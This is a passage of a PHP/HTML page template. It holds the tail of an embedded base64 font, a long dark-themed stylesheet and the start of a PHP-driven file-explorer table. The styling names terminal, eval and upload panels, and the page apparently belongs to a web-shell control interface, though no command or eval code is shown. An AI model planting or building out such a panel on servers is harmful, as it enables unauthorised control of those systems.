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) format('woff');
  font-weight: normal;
  font-style: normal;
}

* {
  font-family: cousineregular;
  margin: 0;
  padding: 0;
  border: 0;
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  box-sizing: border-box;
  font-size: 11px;
  font-weight: normal;
}

input:focus,
select:focus,
textarea:focus,
button:focus {
  outline: none;
}

html,
body {
  width: 100%;
  height: 100%;
  color: #999999;
}

body {
  background: #333333;
}

a {
  text-decoration: none;
  color: #999999;
}

a:hover {
  cursor: pointer;
}

p {
  padding: 8px 0;
}

img {
  vertical-align: middle;
}

table {
  width: 100%;
  border-spacing: 0;
}

table td,
table th {
  vertical-align: middle;
  padding: 4px;
}

textarea,
input,
select {
  background: #222222;
  padding: 8px;
  border-radius: 8px;
  color: #999999;
}

textarea {
  resize: vertical;
  width: 100%;
  height: 300px;
  min-height: 300px;
  max-width: 100%;
  min-width: 100%;
}

hr {
  margin: 8px 0;
  border-bottom: 1px dashed #222222;
}

video {
  width: 50%;
  background: #222222;
  border-radius: 8px;
}

h1,
h2 {
  background: #222222;
  border-radius: 8px;
  text-align: center;
  padding: 8px;
  margin-bottom: 8px;
}

pre,
#viewFilecontent {
  word-break: break-all;
  word-wrap: break-word;
}

pre {
  white-space: pre-wrap;
}

#kb13 {
  cursor: pointer;
}

#header {
  width: 100%;
  position: fixed;
}

#headerNav {
  padding: 6px 8px 2px 8px;
  background: #23AD3F;
}

#headerNav img {
  margin: 0 4px;
}

#headerNav a {
  color: #f0f0f0;
}

#menu {
  background: #BDCCB7;
  height: 20px;
}

#menu .menuitem {
  padding: 5px 12px 0px 12px;
  float: left;
  height: 20px;
  background: #BDCCB7;
  color: #000000;
  cursor: pointer;
}

#menu .menuitem:hover,
#menu .menuitemSelected {
  background: #333333;
  color: #999999;
}

#menu .menuitemSelected {
  background: #333333;
}

#basicInfo {
  width: 100%;
  padding: 8px;
}

#content {
  width: 100%;
  height: 100%;
  padding: 48px 4px 10px 4px;
}

#content .menucontent {
  clear: both;
  display: none;
  padding: 10px;
  background: #222222;
  border-radius:10px;
}

#overlay {
  position: fixed;
  top: 0px;
  left: 0px;
  width: 100%;
  height: 100%;
  display: none;
}

#loading {
  width: 64px;
  height: 64px;
  background: #000000;
  border-radius: 32px 0 32px 0;
  margin: auto;
  vertical-align: middle;
  box-shadow: 0 0 16px #000;
}

#ulDragNDrop {
  padding: 32px 0;
  text-align: center;
  background: #222222;
  border-radius: 8px;
}

#form {
  display: none;
}

.box {
  min-width: 50%;
  border: 1px solid #222222;
  padding: 8px 8px 0 8px;
  border-radius: 8px;
  position: fixed;
  background: #111111;
  opacity: 1;
  box-shadow: 1px 1px 25px #150f0f;
  opacity: 0.98;
}

.boxtitle {
  background: #444444;
  color: #aaaaaa;
  border-radius: 8px;
  text-align: center;
  cursor: pointer;
}

.boxtitle a,
.boxtitle a:hover {
  color: #aaaaaa;
}

.boxcontent {
  padding: 2px 0 2px 0;
}

.boxresult {
  padding: 4px 10px 6px 10px;
  border-top: 1px solid #222222;
  margin-top: 4px;
  text-align: center;
}

.boxtbl {
  border: 1px solid #222222;
  border-radius: 8px;
  padding-bottom: 8px;
}

.boxtbl td {
  vertical-align: middle;
  padding: 8px 15px;
  border-bottom: 1px dashed #222222;
}

.boxtbl input,
.boxtbl select,
.boxtbl .button {
  width: 100%;
}

.boxlabel {
  text-align: center;
  border-bottom: 1px solid #222222;
  padding-bottom: 8px;
}

.boxclose {
  background: #222222;
  border-radius: 3px;
  margin-right: 8px;
  margin-top: -2px;
  padding: 2px 8px;
  cursor: pointer;
}

.strong {
  color: #23AD3F;
}

.weak {
  color: #666666;
}

.button {
  min-width: 120px;
  width: 120px;
  margin: 2px 0;
  background: #222222;
  color: #999999;
  padding: 8px;
  border-radius: 8px;
  display: block;
  text-align: center;
  float: left;
  cursor: pointer;
}

.button:hover,
#ulDragNDrop:hover {
  box-shadow: 1px 1px 5px #2a2a2a;
  background: #2a2a2a;
}

.floatLeft {
  float: left;
}

.floatRight {
  float: right;
}

.colFit {
  width: 1px;
  white-space: nowrap;
}

.colSpan {
  width: 100%;
}

.border {
  border: 1px solid #222222;
  border-radius: 8px;
  padding: 8px;
}

.borderbottom {
  border-bottom: 1px dashed #222222;
}

.borderright {
  border-right: 1px dashed #222222;
}

.borderleft {
  border-left: 1px dashed #222222;
}

.hr td {
  border-bottom: 1px dashed #222222;
}

.cBox,
.cBoxAll {
  width: 10px;
  height: 10px;
  border: 1px solid #23AD3F;
  border-radius: 5px;
  margin: auto;
  float: left;
  margin: 2px 6px;
  cursor: pointer;
}

.cBoxSelected {
  background: #23AD3F;
}

.action,
.actionfolder,
.actiondot {
  cursor: pointer;
}

.phpError {
  padding: 8px;
  margin: 8px 0;
  text-align: center;
}

.dataView td,
.dataView th,
#viewFile td {
  vertical-align: top;
  text-align: center;
}

.dataView th {
  border-bottom: none;
}

.dataView tbody tr:hover {
  background: #222222;
}

.dataView tbody {
	border-radius: 10px;
}

.dataView th {
  background: #222222;
  vertical-align: middle;
  padding-top:10px;
  padding-bottom: 10px;
  background: green;
}
.dataView th:first-child {
	border-top-left-radius:5px;
	border-bottom-left-radius:5px;
}

.dataView th:last-child {
	border-top-right-radius:5px;
	border-bottom-right-radius:5px;
}

.dataView tfoot td {
  vertical-align: middle;
}

.dataView .col-cbox {
  width: 20px;
}

.dataView .col-name,
.dataView tr>td:nth-child(2) {
  text-align: left;
}

.dataView .col-size,
.dataView tr>td:nth-child(3) {
  width: 80px;
  text-align: left;
}

.dataView .col-owner {
  width: 140px;
  min-width: 140px;
}

.dataView .col-perms {
  width: 80px;
}

.dataView .col-modified {
  width: 170px;
}

.sortable th {
  cursor: pointer;
}

#viewFile td {
  text-align: left;
}

#viewFilecontent {
  padding: 8px;
  border: 1px solid #222222;
  border-radius: 8px;
}

#terminalPrompt td {
  padding: 0;
}

#terminalInput {
  background: none;
  padding: 0;
  width: 100%;
}

#evalAdditional {
  display: none;
}

.hl_default {
  color: #408494;
}

.hl_keyword {
  color: #999999;
}

.hl_string {
  color: #8EB9D1;
}

.hl_html {
  color: #aaaaaa;
}

.hl_comment {
  color: #FF7000;
}
</style>
<body>
<div style="padding-top: 52px;" id="content">
  <div style="display: block;" class="menucontent" id="explorer">
    <table id="xplTable" class="dataView sortable">
      <thead>
        <tr>
          <th class="col-cbox sorttable_nosort">
            <div class="cBoxAll"></div>
          </th>
          <th class="col-name">name</th>
          <th class="col-size">size</th>
          <th class="col-owner">owner</th>
          <th class="col-perms">perms</th>
          <th class="col-modified">modified</th>
        </tr>
      </thead>
      <tbody>
      	<?php
      	foreach ($FileSystem->dirs() as $key => $value) {
      		?>
      		<tr data-path="<?= realpath($value[0]).DIRECTORY_SEPARATOR ?>">
      			<td>
      				<div class="cBox"></div>
      			</td>
      			<td style="white-space:normal;">
      				<a class="navigate"><?= $value[1] ?></a>
      				<span class="actionfolder floatRight">action</span>
      			</td>
      			<td>DIR</td>
      			<td>root:root</td>
      			<td>drwxr-xr-x</td>
      			<td title="1467817225">06-Jul-2016 15:00:25</td>
      		</tr>
      		<?php
      	}

      	foreach ($FileSystem->files() as $key => $value) {
      		?>
